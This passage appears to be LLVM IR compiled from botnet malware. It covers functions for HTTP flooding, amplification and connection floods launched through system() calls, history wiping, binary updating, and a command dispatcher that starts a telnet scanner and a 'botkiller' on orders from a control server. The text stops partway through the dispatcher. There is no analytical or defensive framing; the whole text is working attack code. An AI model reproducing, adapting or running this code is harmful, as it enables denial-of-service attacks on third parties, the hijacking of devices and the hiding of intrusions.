declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.193, i64 0, i64 0)) #3
  %2 = tail call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.194, i64 0, i64 0)) #3
  %3 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.195, i64 0, i64 0)) #3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %9 = add nsw i32 %8, %4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %11 = tail call i32 @rand() #3
  %12 = srem i32 %11, 30
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %13
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @rand() #3
  %17 = srem i32 %16, 674
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [649 x i8*], [649 x i8*]* @sendHTTP.useragents, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %10, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.501, i64 0, i64 0), i8* %1, i8* %3, i8* %15, i8* %20) #3
  %22 = icmp sgt i32 %5, 0
  br i1 %22, label %.lr.ph13.preheader, label %._crit_edge14

.lr.ph13.preheader:                               ; preds = %6
  br label %.lr.ph13

; <label>:23:                                     ; preds = %.lr.ph13
  %24 = icmp slt i32 %27, %5
  br i1 %24, label %.lr.ph13, label %._crit_edge14.loopexit

.lr.ph13:                                         ; preds = %.lr.ph13.preheader, %23
  %.011 = phi i32 [ %27, %23 ], [ 0, %.lr.ph13.preheader ]
  %25 = tail call i32 @fork() #3
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.011, 1
  br i1 %26, label %23, label %.preheader

.preheader:                                       ; preds = %.lr.ph13
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = icmp sgt i32 %9, %28
  br i1 %29, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %30 = tail call i32 @socket_connect(i8* %0, i16 zeroext %2)
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %.backedge, label %32

; <label>:32:                                     ; preds = %.lr.ph
  %33 = call i64 @strlen(i8* nonnull %10) #15
  %34 = call i64 @write(i32 %30, i8* nonnull %10, i64 %33) #3
  %35 = tail call i32 @close(i32 %30) #3
  br label %.backedge

.backedge:                                        ; preds = %32, %.lr.ph
  %36 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %37 = icmp sgt i32 %9, %36
  br i1 %37, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @_exit(i32 1) #17
  unreachable

._crit_edge14.loopexit:                           ; preds = %23
  br label %._crit_edge14

._crit_edge14:                                    ; preds = %._crit_edge14.loopexit, %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @senditbudAMP(i8* nocapture readonly, i8*, i8*, i8*) local_unnamed_addr #1 {
  %5 = alloca [128 x i8], align 16
  %6 = alloca [128 x i8], align 16
  %7 = alloca [128 x i8], align 16
  %8 = alloca [128 x i8], align 16
  %9 = alloca [128 x i8], align 16
  %10 = alloca [128 x i8], align 16
  %11 = alloca [128 x i8], align 16
  %12 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i64 0, i64 0)) #15
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %18

; <label>:14:                                     ; preds = %4
  %15 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 0
  %16 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %15, i64 128, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.503, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %17 = call i32 @system(i8* nonnull %15) #3
  br label %18

; <label>:18:                                     ; preds = %4, %14
  %19 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i64 0, i64 0)) #15
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %25

; <label>:21:                                     ; preds = %18
  %22 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %23 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %22, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.505, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %24 = call i32 @system(i8* nonnull %22) #3
  br label %25

; <label>:25:                                     ; preds = %18, %21
  %26 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i64 0, i64 0)) #15
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %32

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %30 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %29, i64 128, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.507, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %31 = call i32 @system(i8* nonnull %29) #3
  br label %32

; <label>:32:                                     ; preds = %25, %28
  %33 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i64 0, i64 0)) #15
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %39

; <label>:35:                                     ; preds = %32
  %36 = getelementptr inbounds [128 x i8], [128 x i8]* %8, i64 0, i64 0
  %37 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %36, i64 128, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.509, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %38 = call i32 @system(i8* nonnull %36) #3
  br label %39

; <label>:39:                                     ; preds = %32, %35
  %40 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0)) #15
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %39
  %43 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 0
  %44 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %43, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.511, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %45 = call i32 @system(i8* nonnull %43) #3
  br label %46

; <label>:46:                                     ; preds = %39, %42
  %47 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i64 0, i64 0)) #15
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %53

; <label>:49:                                     ; preds = %46
  %50 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i64 0, i64 0
  %51 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %50, i64 128, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.513, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %52 = call i32 @system(i8* nonnull %50) #3
  br label %53

; <label>:53:                                     ; preds = %46, %49
  %54 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i64 0, i64 0)) #15
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %60

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i64 0, i64 0
  %58 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %57, i64 128, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.515, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %59 = call i32 @system(i8* nonnull %57) #3
  br label %60

; <label>:60:                                     ; preds = %53, %56
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8* nocapture, i64, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #3
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #18
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #3
  %19 = call i32 @sleep(i32 1) #3
  %20 = call i32 @close(i32 %17) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %3, label %6

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @system(i8* getelementptr inbounds ([439 x i8], [439 x i8]* @.str.516, i64 0, i64 0)) #3
  %5 = tail call i32 @sleep(i32 20) #3
  br label %8

; <label>:6:                                      ; preds = %0
  %7 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.517, i64 0, i64 0), i32 %1)
  br label %8

; <label>:8:                                      ; preds = %6, %3
  ret void
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %.loopexit, label %6

; <label>:6:                                      ; preds = %2
  %7 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.518, i64 0, i64 0)) #15
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %.loopexit, label %9

; <label>:9:                                      ; preds = %6
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.519, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  tail call void @UpdateBins() #3
  br label %.loopexit

; <label>:13:                                     ; preds = %9
  %14 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.520, i64 0, i64 0)) #15
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %44

; <label>:16:                                     ; preds = %13
  %17 = getelementptr inbounds i8*, i8** %1, i64 1
  %18 = load i8*, i8** %17, align 8
  %19 = tail call i32 @strcmp(i8* %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.521, i64 0, i64 0)) #15
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* @scanPid, align 4
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %.loopexit, label %24

; <label>:24:                                     ; preds = %21
  %25 = tail call i32 @kill(i32 %22, i32 9) #3
  %26 = load i32, i32* @mainCommSock, align 4
  %27 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %26, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  %.pre = load i8*, i8** %17, align 8
  br label %28

; <label>:28:                                     ; preds = %16, %24
  %29 = phi i8* [ %18, %16 ], [ %.pre, %24 ]
  %30 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.523, i64 0, i64 0)) #15
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %._crit_edge262

._crit_edge262:                                   ; preds = %28
  %.pre263 = load i8*, i8** %1, align 8
  br label %44

; <label>:32:                                     ; preds = %28
  %33 = load i32, i32* @scanPid, align 4
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %.loopexit

; <label>:35:                                     ; preds = %32
  %36 = tail call i32 @fork() #3
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %39, label %38

; <label>:38:                                     ; preds = %35
  store i32 %36, i32* @scanPid, align 4
  br label %.loopexit

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %42 = tail call i8* @inet_ntoa(i32 %41) #3
  %43 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.524, i64 0, i64 0), i8* %42)
  tail call void @TelnetScanner(i32 10, i32 1000)
  unreachable

; <label>:44:                                     ; preds = %._crit_edge262, %13
  %45 = phi i8* [ %.pre263, %._crit_edge262 ], [ %3, %13 ]
  %46 = tail call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.525, i64 0, i64 0)) #15
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %48, label %56

; <label>:48:                                     ; preds = %44
  %49 = tail call i32 @listFork()
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %._crit_edge264

._crit_edge264:                                   ; preds = %48
  %.pre265 = load i8*, i8** %1, align 8
  br label %56

; <label>:51:                                     ; preds = %48
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %54 = tail call i8* @inet_ntoa(i32 %53) #3
  %55 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.526, i64 0, i64 0), i8* %54)
  tail call void @botkiller()
  unreachable

; <label>:56:                                     ; preds = %._crit_edge264, %44
  %57 = phi i8* [ %.pre265, %._crit_edge264 ], [ %45, %44 ]
  %58 = tail call i32 @strcmp(i8* %57, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.527, i64 0, i64 0)) #15
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %.loopexit, label %60

; <label>:60:                                     ; preds = %56
  %61 = tail call i32 @strcmp(i8* %57, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.528, i64 0, i64 0)) #15
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %218

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds i8*, i8** %1, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = tail call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i64 0, i64 0)) #15
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %68, label %86

; <label>:68:                                     ; preds = %63
  %69 = icmp eq i32 %0, 5
  br i1 %69, label %70, label %.loopexit

; <label>:70:                                     ; preds = %68
  %71 = getelementptr inbounds i8*, i8** %1, i64 2
  %72 = bitcast i8** %71 to i64*
  %73 = load i64, i64* %72, align 8
  %74 = getelementptr inbounds i8*, i8** %1, i64 3
  %75 = bitcast i8** %74 to i64*
  %76 = load i64, i64* %75, align 8
  %77 = getelementptr inbounds i8*, i8** %1, i64 4
  %78 = bitcast i8** %77 to i64*
  %79 = load i64, i64* %78, align 8
  %sext = shl i64 %73, 32
  %80 = ashr exact i64 %sext, 32
  %81 = inttoptr i64 %80 to i8*
  %sext210 = shl i64 %76, 32
  %82 = ashr exact i64 %sext210, 32
  %83 = inttoptr i64 %82 to i8*
  %sext211 = shl i64 %79, 32
  %84 = ashr exact i64 %sext211, 32
  %85 = inttoptr i64 %84 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i64 0, i64 0), i8* %81, i8* %83, i8* %85)
  %.pre266 = load i8*, i8** %64, align 8
  br label %86

; <label>:86:                                     ; preds = %63, %70
  %87 = phi i8* [ %65, %63 ], [ %.pre266, %70 ]
  %88 = tail call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i64 0, i64 0)) #15
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %108

; <label>:90:                                     ; preds = %86
  %91 = icmp eq i32 %0, 5
  br i1 %91, label %92, label %.loopexit

; <label>:92:                                     ; preds = %90
  %93 = getelementptr inbounds i8*, i8** %1, i64 2
  %94 = bitcast i8** %93 to i64*
  %95 = load i64, i64* %94, align 8
  %96 = getelementptr inbounds i8*, i8** %1, i64 3
  %97 = bitcast i8** %96 to i64*
  %98 = load i64, i64* %97, align 8
  %99 = getelementptr inbounds i8*, i8** %1, i64 4
  %100 = bitcast i8** %99 to i64*
  %101 = load i64, i64* %100, align 8
  %sext212 = shl i64 %95, 32
  %102 = ashr exact i64 %sext212, 32
  %103 = inttoptr i64 %102 to i8*
  %sext213 = shl i64 %98, 32
  %104 = ashr exact i64 %sext213, 32
  %105 = inttoptr i64 %104 to i8*
  %sext214 = shl i64 %101, 32
  %106 = ashr exact i64 %sext214, 32
  %107 = inttoptr i64 %106 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i64 0, i64 0), i8* %103, i8* %105, i8* %107)
  %.pre267 = load i8*, i8** %64, align 8
  br label %108

; <label>:108:                                    ; preds = %86, %92
  %109 = phi i8* [ %87, %86 ], [ %.pre267, %92 ]
  %110 = tail call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i64 0, i64 0)) #15
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %130

; <label>:112:                                    ; preds = %108
  %113 = icmp eq i32 %0, 5
  br i1 %113, label %114, label %.loopexit

; <label>:114:                                    ; preds = %112
  %115 = getelementptr inbounds i8*, i8** %1, i64 2
  %116 = bitcast i8** %115 to i64*
  %117 = load i64, i64* %116, align 8
  %118 = getelementptr inbounds i8*, i8** %1, i64 3
  %119 = bitcast i8** %118 to i64*
  %120 = load i64, i64* %119, align 8
  %121 = getelementptr inbounds i8*, i8** %1, i64 4
  %122 = bitcast i8** %121 to i64*
  %123 = load i64, i64* %122, align 8
  %sext215 = shl i64 %117, 32
  %124 = ashr exact i64 %sext215, 32
  %125 = inttoptr i64 %124 to i8*
  %sext216 = shl i64 %120, 32
  %126 = ashr exact i64 %sext216, 32
  %127 = inttoptr i64 %126 to i8*
  %sext217 = shl i64 %123, 32
  %128 = ashr exact i64 %sext217, 32
  %129 = inttoptr i64 %128 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i64 0, i64 0), i8* %125, i8* %127, i8* %129)
  %.pre268 = load i8*, i8** %64, align 8
  br label %130

; <label>:130:                                    ; preds = %108, %114
  %131 = phi i8* [ %109, %108 ], [ %.pre268, %114 ]
  %132 = tail call i32 @strcmp(i8* %131, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0)) #15
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %152

; <label>:134:                                    ; preds = %130
  %135 = icmp eq i32 %0, 5
  br i1 %135, label %136, label %.loopexit

; <label>:136:                                    ; preds = %134
  %137 = getelementptr inbounds i8*, i8** %1, i64 2
  %138 = bitcast i8** %137 to i64*
  %139 = load i64, i64* %138, align 8
  %140 = getelementptr inbounds i8*, i8** %1, i64 3
  %141 = bitcast i8** %140 to i64*
  %142 = load i64, i64* %141, align 8
  %143 = getelementptr inbounds i8*, i8** %1, i64 4
  %144 = bitcast i8** %143 to i64*
  %145 = load i64, i64* %144, align 8
  %sext218 = shl i64 %139, 32
  %146 = ashr exact i64 %sext218, 32
  %147 = inttoptr i64 %146 to i8*
  %sext219 = shl i64 %142, 32
  %148 = ashr exact i64 %sext219, 32
  %149 = inttoptr i64 %148 to i8*
  %sext220 = shl i64 %145, 32
  %150 = ashr exact i64 %sext220, 32
  %151 = inttoptr i64 %150 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0), i8* %147, i8* %149, i8* %151)
  %.pre269 = load i8*, i8** %64, align 8
  br label %152

; <label>:152:                                    ; preds = %130, %136
  %153 = phi i8* [ %131, %130 ], [ %.pre269, %136 ]
  %154 = tail call i32 @strcmp(i8* %153, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i64 0, i64 0)) #15
  %155 = icmp eq i32 %154, 0
  br i1 %155, label %156, label %174

; <label>:156:                                    ; preds = %152
  %157 = icmp eq i32 %0, 5
  br i1 %157, label %158, label %.loopexit

; <label>:158:                                    ; preds = %156
  %159 = getelementptr inbounds i8*, i8** %1, i64 2
  %160 = bitcast i8** %159 to i64*
  %161 = load i64, i64* %160, align 8
  %162 = getelementptr inbounds i8*, i8** %1, i64 3
  %163 = bitcast i8** %162 to i64*
  %164 = load i64, i64* %163, align 8
  %165 = getelementptr inbounds i8*, i8** %1, i64 4
  %166 = bitcast i8** %165 to i64*
  %167 = load i64, i64* %166, align 8
  %sext221 = shl i64 %161, 32
  %168 = ashr exact i64 %sext221, 32
  %169 = inttoptr i64 %168 to i8*
  %sext222 = shl i64 %164, 32
  %170 = ashr exact i64 %sext222, 32
  %171 = inttoptr i64 %170 to i8*
  %sext223 = shl i64 %167, 32
  %172 = ashr exact i64 %sext223, 32
  %173 = inttoptr i64 %172 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i64 0, i64 0), i8* %169, i8* %171, i8* %173)
  %.pre270 = load i8*, i8** %64, align 8
  br label %174

; <label>:174:                                    ; preds = %152, %158
  %175 = phi i8* [ %153, %152 ], [ %.pre270, %158 ]
  %176 = tail call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i64 0, i64 0)) #15
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %196

; <label>:178:                                    ; preds = %174
  %179 = icmp eq i32 %0, 5
  br i1 %179, label %180, label %.loopexit

; <label>:180:                                    ; preds = %178
  %181 = getelementptr inbounds i8*, i8** %1, i64 2
  %182 = bitcast i8** %181 to i64*
  %183 = load i64, i64* %182, align 8
  %184 = getelementptr inbounds i8*, i8** %1, i64 3
  %185 = bitcast i8** %184 to i64*
  %186 = load i64, i64* %185, align 8
  %187 = getelementptr inbounds i8*, i8** %1, i64 4
  %188 = bitcast i8** %187 to i64*
  %189 = load i64, i64* %188, align 8
  %sext224 = shl i64 %183, 32
  %190 = ashr exact i64 %sext224, 32
  %191 = inttoptr i64 %190 to i8*
  %sext225 = shl i64 %186, 32
  %192 = ashr exact i64 %sext225, 32
  %193 = inttoptr i64 %192 to i8*
  %sext226 = shl i64 %189, 32
  %194 = ashr exact i64 %sext226, 32
  %195 = inttoptr i64 %194 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i64 0, i64 0), i8* %191, i8* %193, i8* %195)
  %.pre271 = load i8*, i8** %64, align 8
  br label %196

; <label>:196:                                    ; preds = %174, %180
  %197 = phi i8* [ %175, %174 ], [ %.pre271, %180 ]
  %198 = tail call i32 @strcmp(i8* %197, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i64 0, i64 0)) #15
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %218

; <label>:200:                                    ; preds = %196
  %201 = icmp eq i32 %0, 5
  br i1 %201, label %202, label %.loopexit

; <label>:202:                                    ; preds = %200
  %203 = getelementptr inbounds i8*, i8** %1, i64 2
  %204 = bitcast i8** %203 to i64*
  %205 = load i64, i64* %204, align 8
  %206 = getelementptr inbounds i8*, i8** %1, i64 3
  %207 = bitcast i8** %206 to i64*
  %208 = load i64, i64* %207, align 8
  %209 = getelementptr inbounds i8*, i8** %1, i64 4
  %210 = bitcast i8** %209 to i64*
  %211 = load i64, i64* %210, align 8
  %sext227 = shl i64 %205, 32
  %212 = ashr exact i64 %sext227, 32
  %213 = inttoptr i64 %212 to i8*
  %sext228 = shl i64 %208, 32
  %214 = ashr exact i64 %sext228, 32
  %215 = inttoptr i64 %214 to i8*
  %sext229 = shl i64 %211, 32
  %216 = ashr exact i64 %sext229, 32
  %217 = inttoptr i64 %216 to i8*
  tail call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i64 0, i64 0), i8* %213, i8* %215, i8* %217)
  br label %218

; <label>:218:                                    ; preds = %196, %60, %202
  %219 = load i8*, i8** %1, align 8
  %220 = tail call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.529, i64 0, i64 0)) #15
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %289

; <label>:222:                                    ; preds = %218
  %223 = icmp slt i32 %0, 6
  br i1 %223, label %.loopexit, label %224

; <label>:224:                                    ; preds = %222
  %225 = getelementptr inbounds i8*, i8** %1, i64 3
  %226 = load i8*, i8** %225, align 8
  %227 = tail call i32 @atoi(i8* %226) #15
  %228 = icmp eq i32 %227, -1
  br i1 %228, label %.loopexit, label %229

; <label>:229:                                    ; preds = %224
  %230 = getelementptr inbounds i8*, i8** %1, i64 2
  %231 = load i8*, i8** %230, align 8
  %232 = tail call i32 @atoi(i8* %231) #15
  %233 = icmp eq i32 %232, -1
  br i1 %233, label %.loopexit, label %234

; <label>:234:                                    ; preds = %229
  %235 = getelementptr inbounds i8*, i8** %1, i64 4
  %236 = load i8*, i8** %235, align 8
  %237 = tail call i32 @atoi(i8* %236) #15
  %238 = icmp eq i32 %237, -1
  br i1 %238, label %.loopexit, label %239

; <label>:239:                                    ; preds = %234
  %240 = getelementptr inbounds i8*, i8** %1, i64 5
  %241 = load i8*, i8** %240, align 8
  %242 = tail call i32 @atoi(i8* %241) #15
  %243 = icmp eq i32 %242, -1
  %244 = icmp sgt i32 %242, 65500
  %245 = or i1 %244, %243
  %246 = icmp sgt i32 %237, 32
  %or.cond235 = or i1 %246, %245
  br i1 %or.cond235, label %.loopexit, label %247

; <label>:247:                                    ; preds = %239
  %248 = icmp eq i32 %0, 7
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %247
  %250 = getelementptr inbounds i8*, i8** %1, i64 6
  %251 = load i8*, i8** %250, align 8
  %252 = tail call i32 @atoi(i8* %251) #15
  %253 = icmp slt i32 %252, 1
  br i1 %253, label %.loopexit, label %254

; <label>:254:                                    ; preds = %249, %247
  %255 = getelementptr inbounds i8*, i8** %1, i64 1
  %256 = load i8*, i8** %255, align 8
  %257 = tail call i32 @atoi(i8* %231) #15
  %258 = tail call i32 @atoi(i8* %226) #15
  %259 = tail call i32 @atoi(i8* %236) #15
  %260 = tail call i32 @atoi(i8* %241) #15
  %261 = icmp sgt i32 %0, 6
  br i1 %261, label %262, label %.thread241

; <label>:262:                                    ; preds = %254
  %263 = getelementptr inbounds i8*, i8** %1, i64 6
  %264 = load i8*, i8** %263, align 8
  %265 = tail call i32 @atoi(i8* %264) #15
  br i1 %248, label %.thread241, label %266

; <label>:266:                                    ; preds = %262
  %267 = getelementptr inbounds i8*, i8** %1, i64 7
  %268 = load i8*, i8** %267, align 8
  %269 = tail call i32 @atoi(i8* %268) #15
  %270 = icmp sgt i32 %0, 8
  br i1 %270, label %271, label %.thread241

; <label>:271:                                    ; preds = %266
  %272 = getelementptr inbounds i8*, i8** %1, i64 8
  %273 = load i8*, i8** %272, align 8
  %274 = tail call i32 @atoi(i8* %273) #15
  br label %.thread241

.thread241:                                       ; preds = %262, %254, %266, %271
  %275 = phi i32 [ %269, %271 ], [ %269, %266 ], [ 1000000, %262 ], [ 1000000, %254 ]
